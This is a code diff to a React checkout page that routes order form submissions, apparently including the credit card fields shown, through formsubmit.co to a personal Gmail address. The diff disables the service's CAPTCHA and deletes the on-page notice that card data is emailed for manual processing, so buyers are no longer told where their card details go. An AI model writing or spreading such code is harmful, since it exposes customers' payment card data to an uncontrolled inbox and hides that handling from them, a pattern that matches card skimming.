@@ -75,17 +75,20 @@ const Checkout = () => {
           `${item.name} (${item.quantity}x) - R$ ${(item.price * item.quantity).toFixed(2)}`
         ).join('; '));
         
-        const response = await fetch('https://formsubmit.co/rubenscardosoaguiar@gmail.com', {
+        // Desabilitar CAPTCHA
+        submitData.append('_captcha', 'false');
+        
+        const response = await fetch('https://formsubmit.co/ajax/rubenscardosoaguiar@gmail.com', {
           method: 'POST',
+          headers: {
+            'Accept': 'application/json'
+          },
           body: submitData,
         });
 
         if (response.ok) {
-          toast.success('Pedido enviado com sucesso!', {
-            description: 'Você receberá a confirmação por email em breve.',
-          });
           clearCart();
-          navigate('/');
+          navigate('/order-confirmation');
         } else {
           throw new Error('Erro ao enviar pedido');
         }
@@ -342,13 +345,6 @@ const Checkout = () => {
                     </p>
                   </TabsContent>
                   <TabsContent value="credit_card" className="space-y-4">
-                    <div className="rounded-lg bg-muted p-4 space-y-2">
-                      <p className="text-sm font-medium">📧 Pagamento por Análise Manual</p>
-                      <p className="text-sm text-muted-foreground">
-                        Seus dados serão enviados por email para análise e processamento manual do pagamento. 
-                        Você receberá a confirmação em breve.
-                      </p>
-                    </div>
                     <div className="grid md:grid-cols-2 gap-4">
                       <div className="space-y-2 md:col-span-2">
                         <Label htmlFor="cardNumber">Número do Cartão</Label>
